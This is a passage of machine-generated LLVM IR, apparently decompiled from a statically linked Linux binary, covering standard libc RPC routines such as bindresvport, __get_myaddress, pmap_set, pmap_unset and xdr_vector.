  %v1_8066246 = call i32 @__libc_getpid(i32 %v0_8066246)
  %v2_8066246 = sext i32 %v1_8066246 to i64
  %v2_8066252 = ashr i32 %v1_8066246, 31
  %v5_8066253 = zext i32 %v2_8066252 to i64
  %v6_8066253 = mul nuw i64 %v5_8066253, 4294967296
  %v7_8066253 = or i64 %v6_8066253, %v2_8066246
  %v9_8066253 = sdiv i64 %v7_8066253, 424
  %v10_8066253 = trunc i64 %v9_8066253 to i32
  store i32 %v10_8066253, i32* %eax.global-to-local, align 4
  %v11_8066253 = srem i64 %v7_8066253, 424
  %v1_8066255 = trunc i64 %v11_8066253 to i16
  %v2_8066255 = add i16 %v1_8066255, 600
  store i16 %v2_8066255, i16* @global_var_807d2a8.840, align 8
  %v0_8066261.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_8066261

dec_label_pc_8066261:                             ; preds = %dec_label_pc_806623c, %dec_label_pc_8066246
  %v0_8066261 = phi i32 [ %v0_8066246, %dec_label_pc_806623c ], [ %v0_8066261.pre, %dec_label_pc_8066246 ]
  %v1_8066261 = call i32 @__errno_location(i32 %v0_8066261)
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v1_8066261, i32* %edi.global-to-local, align 4
  %v1_806626a = inttoptr i32 %v1_8066261 to i32*
  store i32 98, i32* %v1_806626a, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80662a917 = load i32, i32* %esi.global-to-local, align 4
  %v1_80662a918 = add i32 %v0_80662a917, -423
  %v6_80662a920 = sub i32 422, %v0_80662a917
  %v7_80662a921 = and i32 %v6_80662a920, %v0_80662a917
  %v8_80662a922 = icmp slt i32 %v7_80662a921, 0
  %v9_80662a923 = icmp eq i32 %v1_80662a918, 0
  %v10_80662a924 = icmp slt i32 %v1_80662a918, 0
  %v3_80662af25 = icmp eq i1 %v10_80662a924, %v8_80662a922
  %v4_80662af26 = icmp eq i1 %v9_80662a923, false
  %v5_80662af27 = and i1 %v4_80662af26, %v3_80662af25
  br i1 %v5_80662af27, label %dec_label_pc_80662ba, label %dec_label_pc_80662b1

dec_label_pc_8066275:                             ; preds = %dec_label_pc_80662b5
  %v0_8066275 = load i16, i16* @global_var_807d2a8.840, align 8
  %v1_8066275 = zext i16 %v0_8066275 to i32
  %v3_8066275 = and i32 %v2_806627528, -65536
  %v4_8066275 = or i32 %v1_8066275, %v3_8066275
  %v1_806627d = add i32 %v4_8066275, 1
  store i32 %v1_806627d, i32* %eax.global-to-local, align 4
  %v2_806627e = call i16 @llvm.bswap.i16(i16 %v0_8066275)
  %v1_8066282 = trunc i32 %v1_806627d to i16
  %v2_8066286 = load i32, i32* @ebx, align 4
  %v3_8066286 = add i32 %v2_8066286, 2
  %v4_8066286 = inttoptr i32 %v3_8066286 to i16*
  store i16 %v2_806627e, i16* %v4_8066286, align 2
  %v0_806628a = load i32, i32* %eax.global-to-local, align 4
  %v1_806628a = trunc i32 %v0_806628a to i16
  %v7_8066290 = icmp sgt i16 %v1_8066282, 1023
  %.v1_806628a = select i1 %v7_8066290, i16 600, i16 %v1_806628a
  store i16 %.v1_806628a, i16* @global_var_807d2a8.840, align 8
  %v0_806629e = load i32, i32* @ebx, align 4
  %v0_80662a0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80662a0 = add i32 %v0_80662a0, 1
  store i32 %v1_80662a0, i32* %esi.global-to-local, align 4
  %v4_80662a1 = call i32 @bind(i32 %v0_806629e, i32 16, i32 %v0_806628a)
  store i32 %v4_80662a1, i32* %eax.global-to-local, align 4
  %v1_80662a9 = add i32 %v0_80662a0, -422
  %v6_80662a9 = sub i32 421, %v0_80662a0
  %v7_80662a9 = and i32 %v6_80662a9, %v1_80662a0
  %v8_80662a9 = icmp slt i32 %v7_80662a9, 0
  %v9_80662a9 = icmp eq i32 %v1_80662a9, 0
  %v10_80662a9 = icmp slt i32 %v1_80662a9, 0
  %v3_80662af = icmp eq i1 %v10_80662a9, %v8_80662a9
  %v4_80662af = icmp eq i1 %v9_80662a9, false
  %v5_80662af = and i1 %v4_80662af, %v3_80662af
  br i1 %v5_80662af, label %dec_label_pc_80662ba, label %dec_label_pc_80662b1

dec_label_pc_80662b1:                             ; preds = %dec_label_pc_8066261, %dec_label_pc_8066275
  %v2_806627528 = phi i32 [ %v4_80662a1, %dec_label_pc_8066275 ], [ -1, %dec_label_pc_8066261 ]
  %v2_80662b1 = icmp slt i32 %v2_806627528, 0
  %v1_80662b3 = icmp eq i1 %v2_80662b1, false
  br i1 %v1_80662b3, label %dec_label_pc_80662ba, label %dec_label_pc_80662b5

dec_label_pc_80662b5:                             ; preds = %dec_label_pc_80662b1
  %v0_80662b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80662b5 = inttoptr i32 %v0_80662b5 to i32*
  %v2_80662b5 = load i32, i32* %v1_80662b5, align 4
  %v11_80662b5 = icmp eq i32 %v2_80662b5, 98
  br i1 %v11_80662b5, label %dec_label_pc_8066275, label %dec_label_pc_80662ba

dec_label_pc_80662ba:                             ; preds = %dec_label_pc_8066261, %dec_label_pc_8066275, %dec_label_pc_80662b1, %dec_label_pc_80662b5, %dec_label_pc_806622c
  %v0_80662c1 = phi i32 [ -1, %dec_label_pc_806622c ], [ -1, %dec_label_pc_8066261 ], [ %v4_80662a1, %dec_label_pc_8066275 ], [ %v2_806627528, %dec_label_pc_80662b1 ], [ %v2_806627528, %dec_label_pc_80662b5 ]
  store i32 %v0_80661fb, i32* @ebx, align 4
  ret i32 %v0_80662c1

; uselistorder directives
  uselistorder i32 %v1_80662a9, { 1, 0 }
  uselistorder i32 %v1_8066261, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 0, 3, 1, 4, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -65536, { 13, 4, 5, 2, 14, 15, 16, 6, 7, 8, 1, 0, 9, 10, 3, 11, 12 }
  uselistorder i32 98, { 0, 2, 1 }
  uselistorder i64 424, { 1, 0 }
  uselistorder i32 31, { 52, 55, 56, 49, 50, 25, 23, 57, 58, 21, 2, 3, 0, 1, 12, 51, 26, 27, 28, 6, 7, 4, 5, 22, 8, 9, 29, 24, 59, 60, 53, 54, 13, 14, 15, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 16, 42, 43, 10, 44, 45, 46, 17, 47, 18, 11, 48, 19, 20 }
  uselistorder i32 (i32)* @__libc_getpid, { 1, 5, 2, 11, 10, 9, 8, 7, 4, 3, 6, 0 }
  uselistorder i16* @global_var_807d2a8.840, { 3, 2, 1, 0 }
  uselistorder i32 96, { 5, 2, 3, 6, 0, 1, 4 }
  uselistorder i16* null, { 1, 0, 2 }
  uselistorder i16* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80662ba, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_80662b1, { 1, 0 }
  uselistorder label %dec_label_pc_8066261, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_2()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4152 = alloca i32, align 4
  %tmp30 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_80662c4 = load i32, i32* @ebp, align 4
  %v0_80662c5 = load i32, i32* @edi, align 4
  %v0_80662c6 = load i32, i32* @esi, align 4
  %v0_80662c7 = load i32, i32* @ebx, align 4
  store i32 %v0_80662c7, i32* %stack_var_-16, align 4
  %v0_80662ce = load i32, i32* @eax, align 4
  %v4_80662d8 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v4_80662d8, i32* @ebp, align 4
  %v2_80662e2 = icmp slt i32 %v4_80662d8, 0
  %v1_80662e4 = icmp eq i1 %v2_80662e2, false
  br i1 %v1_80662e4, label %dec_label_pc_80662f0, label %dec_label_pc_80662e6

dec_label_pc_80662e6:                             ; preds = %entry
  br label %dec_label_pc_8066331

dec_label_pc_80662f0:                             ; preds = %entry
  %v2_80662f0 = ptrtoint i32* %stack_var_-4152 to i32
  store i32 4096, i32* %stack_var_-24, align 4
  %v2_8066306 = ptrtoint i32* %stack_var_-24 to i32
  %v0_806630d = load i32, i32* @ebx, align 4
  %v3_8066315 = call i32 @ioctl(i32 35090, i32 %v2_8066306, i32 %v0_806630d)
  %v2_806631d = icmp slt i32 %v3_8066315, 0
  %v1_8066327 = icmp eq i1 %v2_806631d, false
  br i1 %v1_8066327, label %dec_label_pc_8066342.preheader, label %dec_label_pc_8066329

dec_label_pc_8066329:                             ; preds = %dec_label_pc_80662f0
  br label %dec_label_pc_8066331

dec_label_pc_8066331:                             ; preds = %dec_label_pc_8066379, %dec_label_pc_80662e6, %dec_label_pc_8066329
  %stack_var_-4176.0 = phi i32 [ %stack_var_-4176.1, %dec_label_pc_8066379 ], [ %v0_806630d, %dec_label_pc_8066329 ], [ %tmp30, %dec_label_pc_80662e6 ]
  %stack_var_-4180.0 = phi i32 [ %v2_8066352, %dec_label_pc_8066379 ], [ %v2_8066306, %dec_label_pc_8066329 ], [ 0, %dec_label_pc_80662e6 ]
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1, %dec_label_pc_8066379 ], [ 1, %dec_label_pc_8066329 ], [ %tmp19, %dec_label_pc_80662e6 ]
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8066379 ], [ %v2_80662f0, %dec_label_pc_8066329 ], [ %tmp20, %dec_label_pc_80662e6 ]
  %v0_8066331 = phi i8* [ getelementptr inbounds ([23 x i8], [23 x i8]* @global_var_806e365.843, i32 0, i32 0), %dec_label_pc_8066379 ], [ getelementptr inbounds ([53 x i8], [53 x i8]* @global_var_806e330.842, i32 0, i32 0), %dec_label_pc_8066329 ], [ getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_806e318.841, i32 0, i32 0), %dec_label_pc_80662e6 ]
  %v3_8066331 = call i32 @perror(i8* nonnull %v0_8066331)
  %v2_806633d = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_8066342.preheader

dec_label_pc_8066342.preheader:                   ; preds = %dec_label_pc_8066331, %dec_label_pc_80662f0
  %stack_var_-4176.1 = phi i32 [ %v0_806630d, %dec_label_pc_80662f0 ], [ %stack_var_-4176.0, %dec_label_pc_8066331 ]
  %stack_var_-4180.1 = phi i32 [ %v2_8066306, %dec_label_pc_80662f0 ], [ %stack_var_-4180.0, %dec_label_pc_8066331 ]
  %stack_var_-4164.1.ph = phi i32 [ 1, %dec_label_pc_80662f0 ], [ %stack_var_-4164.0, %dec_label_pc_8066331 ]
  %stack_var_-20.1.ph = phi i32 [ %v2_80662f0, %dec_label_pc_80662f0 ], [ %stack_var_-20.0, %dec_label_pc_8066331 ]
  %v2_8066352 = ptrtoint i32* %stack_var_-56 to i32
  %v2_806638b = urem i16 %tmp, 2
  %v3_806638b = icmp eq i16 %v2_806638b, 0
  %v2_8066396 = and i16 %tmp, 8
  %v3_8066396 = icmp eq i16 %v2_8066396, 0
  %v1_8066398 = icmp eq i1 %v3_8066396, false
  br label %dec_label_pc_8066342

dec_label_pc_8066342:                             ; preds = %dec_label_pc_8066342.preheader, %dec_label_pc_80663d8
  %stack_var_-4180.2 = phi i32 [ %stack_var_-4180.1, %dec_label_pc_8066342.preheader ], [ %stack_var_-4180.3, %dec_label_pc_80663d8 ]
  %stack_var_-4164.1 = phi i32 [ %stack_var_-4164.1.ph, %dec_label_pc_8066342.preheader ], [ 0, %dec_label_pc_80663d8 ]
  store i32 %stack_var_-20.1.ph, i32* @esi, align 4
  %v3_8066349 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8066349, i32* @edi, align 4
  %v1_80663d05 = icmp eq i32 %v3_8066349, 0
  %v1_80663d212 = icmp eq i1 %v1_80663d05, false
  br i1 %v1_80663d212, label %dec_label_pc_8066352.lr.ph, label %dec_label_pc_80663d8

dec_label_pc_8066352.lr.ph:                       ; preds = %dec_label_pc_8066342
  %v4_806639a = icmp eq i32 %stack_var_-4164.1, 0
  %v1_806639f = icmp eq i1 %v4_806639a, false
  br label %dec_label_pc_8066352

dec_label_pc_8066352:                             ; preds = %dec_label_pc_8066352.lr.ph, %dec_label_pc_80663ca
  %v0_806635c = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_8066352.lr.ph ], [ %v1_80663ca, %dec_label_pc_80663ca ]
  store i32 %v2_8066352, i32* @ebx, align 4
  %v0_8066359 = load i32, i32* @ecx, align 4
  %v4_806635e = inttoptr i32 %v0_8066359 to i16*
  %v5_806635e = call i32 @memcpy(i16* %v4_806635e, i32 %v2_8066352, i32 %v0_806635c)
  %v3_806636d = call i32 @ioctl(i32 35091, i32 %v2_8066352, i32 %stack_var_-4176.1)
  %v2_8066375 = icmp slt i32 %v3_806636d, 0
  %v1_8066377 = icmp eq i1 %v2_8066375, false
  br i1 %v1_8066377, label %dec_label_pc_8066383, label %dec_label_pc_8066379

dec_label_pc_8066379:                             ; preds = %dec_label_pc_8066352
  br label %dec_label_pc_8066331

dec_label_pc_8066383:                             ; preds = %dec_label_pc_8066352
  %v0_80663ca.pre = load i32, i32* @esi, align 4
  br i1 %v3_806638b, label %dec_label_pc_80663ca, label %dec_label_pc_806638f

dec_label_pc_806638f:                             ; preds = %dec_label_pc_8066383
  %v1_806638f = add i32 %v0_80663ca.pre, 16
  %v2_806638f = inttoptr i32 %v1_806638f to i16*
  %v3_806638f = load i16, i16* %v2_806638f, align 2
  %v12_806638f = icmp eq i16 %v3_806638f, 2
  %v1_8066394 = icmp eq i1 %v12_806638f, false
  br i1 %v1_8066394, label %dec_label_pc_80663ca, label %dec_label_pc_8066396

dec_label_pc_8066396:                             ; preds = %dec_label_pc_806638f
  br i1 %v1_8066398, label %dec_label_pc_80663a1, label %dec_label_pc_806639a

dec_label_pc_806639a:                             ; preds = %dec_label_pc_8066396
  br i1 %v1_806639f, label %dec_label_pc_80663ca, label %dec_label_pc_80663a1

dec_label_pc_80663a1:                             ; preds = %dec_label_pc_806639a, %dec_label_pc_8066396
  %tmp36 = inttoptr i32 %v0_80662ce to i16*
  %v5_80663ac = call i32 @memcpy(i16* %tmp36, i32 %v1_806638f, i32 16)
  %v1_80663b5 = add i32 %v0_80662ce, 2
  %v2_80663b5 = inttoptr i32 %v1_80663b5 to i16*
  store i16 28416, i16* %v2_80663b5, align 2
  %v0_80663bb = load i32, i32* @ebp, align 4
  %v2_80663be = call i32 @__libc_close(i32 %v0_80663bb)
  br label %dec_label_pc_80663f7

dec_label_pc_80663ca:                             ; preds = %dec_label_pc_8066383, %dec_label_pc_806639a, %dec_label_pc_806638f
  %v1_80663ca = add i32 %v0_80663ca.pre, 32
  store i32 %v1_80663ca, i32* @esi, align 4
  %v0_80663cd = load i32, i32* @edi, align 4
  %v1_80663cd = add i32 %v0_80663cd, -32
  %v6_80663cd = icmp eq i32 %v1_80663cd, 0
  store i32 %v1_80663cd, i32* @edi, align 4
  %v1_80663d2 = icmp eq i1 %v6_80663cd, false
  br i1 %v1_80663d2, label %dec_label_pc_8066352, label %dec_label_pc_80663d8

dec_label_pc_80663d8:                             ; preds = %dec_label_pc_80663ca, %dec_label_pc_8066342
  %stack_var_-4180.3 = phi i32 [ %stack_var_-4180.2, %dec_label_pc_8066342 ], [ %v2_8066352, %dec_label_pc_80663ca ]
  %v12_80663d8 = icmp eq i32 %stack_var_-4180.3, 1
  %v1_80663dd = icmp eq i1 %v12_80663d8, false
  br i1 %v1_80663dd, label %dec_label_pc_80663ec, label %dec_label_pc_8066342

dec_label_pc_80663ec:                             ; preds = %dec_label_pc_80663d8
  %v0_80663ef = load i32, i32* @ebp, align 4
  %v2_80663f0 = call i32 @__libc_close(i32 %v0_80663ef)
  br label %dec_label_pc_80663f7

dec_label_pc_80663f7:                             ; preds = %dec_label_pc_80663a1, %dec_label_pc_80663ec
  %storemerge2 = phi i32 [ 0, %dec_label_pc_80663ec ], [ 1, %dec_label_pc_80663a1 ]
  %v2_80663fd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80663fd, i32* @ebx, align 4
  store i32 %v0_80662c6, i32* @esi, align 4
  store i32 %v0_80662c5, i32* @edi, align 4
  store i32 %v0_80662c4, i32* @ebp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_80663ca, { 1, 0 }
  uselistorder i32 %stack_var_-4164.1, { 1, 0 }
  uselistorder i32 %v2_8066352, { 0, 2, 3, 4, 1 }
  uselistorder i32 %stack_var_-4176.1, { 1, 0 }
  uselistorder i32 %v0_806630d, { 1, 0, 2 }
  uselistorder i32 %v2_8066306, { 1, 0, 2 }
  uselistorder i32 %v4_80662d8, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 8, 7, 6, 26, 25, 24, 23, 22, 21, 20, 19, 27, 18, 9, 17, 16, 15, 14, 13, 12, 5, 11, 10, 3, 2, 4 }
  uselistorder i16 28416, { 1, 0 }
  uselistorder i16 8, { 0, 2, 3, 4, 6, 1, 5 }
  uselistorder i16 2, { 12, 0, 13, 1, 19, 14, 15, 16, 17, 18, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 (i32)* @__GI_exit, { 2, 1, 0, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i8*)* @perror, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 10, 9, 8, 7, 12, 11, 3, 0, 6, 13, 5, 4 }
  uselistorder i32 35090, { 0, 2, 1 }
  uselistorder i32 4096, { 31, 28, 3, 29, 36, 37, 8, 35, 30, 32, 0, 1, 33, 9, 5, 10, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 34, 2, 27, 25, 7, 26, 6 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 38, 37, 4, 1, 15, 36, 35, 34, 39, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder label %dec_label_pc_80663f7, { 1, 0 }
  uselistorder label %dec_label_pc_80663ca, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8066352, { 1, 0 }
  uselistorder label %dec_label_pc_8066342, { 1, 0 }
  uselistorder label %dec_label_pc_8066331, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8066402 = load i32, i32* @ebx, align 4
  %v2_8066406 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8066406, i32* @ebx, align 4
  store i32 -1, i32* %stack_var_-8, align 4
  store i32 %v2_8066406, i32* @eax, align 4
  %v2_8066414 = call i32 @__get_myaddress(i32 -1, i32 %v0_8066402)
  %v1_8066419 = icmp eq i32 %v2_8066414, 0
  br i1 %v1_8066419, label %entry.dec_label_pc_80664ad_crit_edge, label %dec_label_pc_8066421

entry.dec_label_pc_80664ad_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80664ad

dec_label_pc_8066421:                             ; preds = %entry
  %v2_806642b = ptrtoint i32* %stack_var_-8 to i32
  %v9_8066444 = call i32 @__GI_clntudp_bufcreate(i32 %v2_8066406, i32 100000, i32 2, i32 5, i32* null, i32 %v2_806642b, i32 400, i32 400)
  store i32 %v9_8066444, i32* %ebx.global-to-local, align 4
  %v1_806644e = icmp eq i32 %v9_8066444, 0
  br i1 %v1_806644e, label %dec_label_pc_80664ad, label %dec_label_pc_8066452

dec_label_pc_8066452:                             ; preds = %dec_label_pc_8066421
  %v1_806647a = add i32 %v9_8066444, 4
  %v2_806647a = inttoptr i32 %v1_806647a to i32*
  %v3_806647a = load i32, i32* %v2_806647a, align 4
  store i32 %v3_806647a, i32* @ecx, align 4
  %v5_8066498 = inttoptr i32 %v3_806647a to i32*
  %v6_8066498 = load i32, i32* %v5_8066498, align 4
  call void @__pseudo_call(i32 %v6_8066498)
  %v0_806649d = load i32, i32* %ebx.global-to-local, align 4
  %v1_806649d = add i32 %v0_806649d, 4
  %v2_806649d = inttoptr i32 %v1_806649d to i32*
  %v3_806649d = load i32, i32* %v2_806649d, align 4
  %v5_80664a1 = add i32 %v3_806649d, 16
  %v6_80664a1 = inttoptr i32 %v5_80664a1 to i32*
  %v7_80664a1 = load i32, i32* %v6_80664a1, align 4
  call void @__pseudo_call(i32 %v7_80664a1)
  %v2_80664b2.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80664af

dec_label_pc_80664ad:                             ; preds = %entry.dec_label_pc_80664ad_crit_edge, %dec_label_pc_8066421
  br label %dec_label_pc_80664af

dec_label_pc_80664af:                             ; preds = %dec_label_pc_8066452, %dec_label_pc_80664ad
  %v2_80664b2 = phi i32 [ %v2_80664b2.pre, %dec_label_pc_8066452 ], [ %tmp12, %dec_label_pc_80664ad ]
  %v0_80664b3 = phi i32 [ %tmp, %dec_label_pc_8066452 ], [ 0, %dec_label_pc_80664ad ]
  store i32 %v2_80664b2, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80664b3

; uselistorder directives
  uselistorder i32 %v9_8066444, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_80664af, { 1, 0 }
  uselistorder label %dec_label_pc_80664ad, { 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80664b5 = load i32, i32* @ebx, align 4
  %v2_80664b9 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80664b9, i32* @ebx, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %v2_80664b9, i32* @eax, align 4
  store i32 -1, i32* %stack_var_-12, align 4
  %v2_80664cb = call i32 @__get_myaddress(i32 -1, i32 %v0_80664b5)
  %v1_80664d0 = icmp eq i32 %v2_80664cb, 0
  br i1 %v1_80664d0, label %entry.dec_label_pc_8066582_crit_edge, label %dec_label_pc_80664d8

entry.dec_label_pc_8066582_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8066582

dec_label_pc_80664d8:                             ; preds = %entry
  %v2_80664e2 = ptrtoint i32* %stack_var_-12 to i32
  %v9_80664fb = call i32 @__GI_clntudp_bufcreate(i32 %v2_80664b9, i32 100000, i32 2, i32 5, i32* null, i32 %v2_80664e2, i32 400, i32 400)
  store i32 %v9_80664fb, i32* @ebx, align 4
  %v1_8066505 = icmp eq i32 %v9_80664fb, 0
  br i1 %v1_8066505, label %dec_label_pc_8066582, label %dec_label_pc_806656f

dec_label_pc_806656f:                             ; preds = %dec_label_pc_80664d8
  %v1_8066530 = add i32 %v9_80664fb, 4
  %v2_8066530 = inttoptr i32 %v1_8066530 to i32*
  %v3_8066530 = load i32, i32* %v2_8066530, align 4
  store i32 %v3_8066530, i32* @ecx, align 4
  %v5_806654e = inttoptr i32 %v3_8066530 to i32*
  %v6_806654e = load i32, i32* %v5_806654e, align 4
  call void @__pseudo_call(i32 %v6_806654e)
  %v0_8066557 = load i32, i32* @esi, align 4
  %v0_806655e = load i32, i32* @ebx, align 4
  %v4_806655f = call i32 @clnt_perror(i32 %v0_806655e, i32 ptrtoint ([24 x i8]* @global_var_806e37c.848 to i32), i32 %v0_8066557, i32 %v0_8066557)
  %v0_8066572 = load i32, i32* @ebx, align 4
  %v1_8066572 = add i32 %v0_8066572, 4
  %v2_8066572 = inttoptr i32 %v1_8066572 to i32*
  %v3_8066572 = load i32, i32* %v2_8066572, align 4
  %v5_8066576 = add i32 %v3_8066572, 16
  %v6_8066576 = inttoptr i32 %v5_8066576 to i32*
  %v7_8066576 = load i32, i32* %v6_8066576, align 4
  call void @__pseudo_call(i32 %v7_8066576)
  br label %dec_label_pc_8066584

dec_label_pc_8066582:                             ; preds = %entry.dec_label_pc_8066582_crit_edge, %dec_label_pc_80664d8
  br label %dec_label_pc_8066584

dec_label_pc_8066584:                             ; preds = %dec_label_pc_806656f, %dec_label_pc_8066582
  %v0_8066589 = phi i32 [ %tmp, %dec_label_pc_806656f ], [ 0, %dec_label_pc_8066582 ]
  ret i32 %v0_8066589

; uselistorder directives
  uselistorder i32 %v9_80664fb, { 0, 2, 1 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32*, i32, i32, i32)* @__GI_clntudp_bufcreate, { 0, 3, 2, 1 }
  uselistorder i32* null, { 0, 1, 3, 2, 12, 4, 13, 14, 5, 15, 16, 17, 18, 19, 20, 6, 7, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 8, 31, 32, 33, 34, 9, 35, 36, 37, 38, 10, 39, 40, 11, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32 100000, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_8066584, { 1, 0 }
  uselistorder label %dec_label_pc_8066582, { 1, 0 }
}

define i32 @_rpc_dtablesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_806658f = load i32, i32* @global_var_807d2ac.849, align 4
  %v1_806658f = icmp eq i32 %v0_806658f, 0
  %v1_8066596 = icmp eq i1 %v1_806658f, false
  br i1 %v1_8066596, label %dec_label_pc_80665a2, label %dec_label_pc_8066598

dec_label_pc_8066598:                             ; preds = %entry
  %v1_8066598 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8066598, i32* @global_var_807d2ac.849, align 4
  br label %dec_label_pc_80665a2

dec_label_pc_80665a2:                             ; preds = %entry, %dec_label_pc_8066598
  %v0_80665a2 = phi i32 [ %v0_806658f, %entry ], [ %v1_8066598, %dec_label_pc_8066598 ]
  ret i32 %v0_80665a2

; uselistorder directives
  uselistorder i32 (i32)* @getdtablesize, { 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_80665a2, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %arg4, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v10_80665d722 = icmp eq i32 %arg3, 0
  br i1 %v10_80665d722, label %dec_label_pc_80665dd, label %dec_label_pc_80665c3

dec_label_pc_80665c3:                             ; preds = %entry, %dec_label_pc_80665d4
  call void @__pseudo_call(i32 %arg5)
  %v0_80665d0 = load i32, i32* @eax, align 4
  %v1_80665d0 = icmp eq i32 %v0_80665d0, 0
  br i1 %v1_80665d0, label %dec_label_pc_80665e2, label %dec_label_pc_80665d4

dec_label_pc_80665d4:                             ; preds = %dec_label_pc_80665c3
  %v0_80665d4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80665d4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80665d4 = add i32 %v1_80665d4, %v0_80665d4
  store i32 %v2_80665d4, i32* %ebx.global-to-local, align 4
  %v0_80665d6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80665d6 = add i32 %v0_80665d6, 1
  store i32 %v1_80665d6, i32* %esi.global-to-local, align 4
  %v10_80665d7 = icmp ult i32 %v1_80665d6, %arg3
  br i1 %v10_80665d7, label %dec_label_pc_80665c3, label %dec_label_pc_80665dd

dec_label_pc_80665dd:                             ; preds = %entry, %dec_label_pc_80665d4
  br label %dec_label_pc_80665e2

dec_label_pc_80665e2:                             ; preds = %dec_label_pc_80665c3, %dec_label_pc_80665dd
  ret i32 1

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80665e2, { 1, 0 }
  uselistorder label %dec_label_pc_80665dd, { 1, 0 }
  uselistorder label %dec_label_pc_80665c3, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp9 = sext i32 %arg5 to i64
  %tmp12 = ptrtoint i32* %arg1 to i32
  %v0_80665ea = load i32, i32* @ebp, align 4
  %v0_80665eb = load i32, i32* @edi, align 4
